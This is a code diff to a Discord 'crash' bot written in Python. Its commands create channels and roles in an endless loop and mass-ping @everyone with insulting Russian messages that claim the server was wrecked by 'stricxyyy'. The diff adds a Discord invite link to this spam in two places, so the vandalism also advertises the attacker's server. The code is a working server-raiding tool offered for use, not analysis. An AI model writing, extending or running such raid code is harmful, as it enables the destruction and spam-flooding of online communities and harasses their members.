@@ -31,7 +31,8 @@ async def crash(ctx):
         while True:
             try:
                 channel = await guild.create_text_channel("Crashed-b1tch")
-                await asyncio.gather(*(channel.send("@everyone сервер вьебан by stricxyyy") for _ in range(5)))
+                # Отправляем основной спам и в конце добавляем ссылку
+                await asyncio.gather(*(channel.send("@everyone сервер вьебан by stricxyyy\nhttps://discord.gg/6Qmyr2dg83") for _ in range(5)))
             except Exception:
                 await asyncio.sleep(0.05)
 
@@ -65,7 +66,8 @@ async def crashold(ctx):
                 role_task = guild.create_role(name="crashed b1tch", color=discord.Color.red())
                 channel, role = await asyncio.gather(channel_task, role_task)
 
-                await asyncio.gather(*(channel.send(f"@everyone сервер вьебан by stricxyyy {role.mention}") for _ in range(5)))
+                # Отправляем основной спам с ролью и в конце добавляем ссылку
+                await asyncio.gather(*(channel.send(f"@everyone сервер вьебан by stricxyyy {role.mention}\nhttps://discord.gg/6Qmyr2dg83") for _ in range(5)))
             except Exception:
                 await asyncio.sleep(0.1)
 
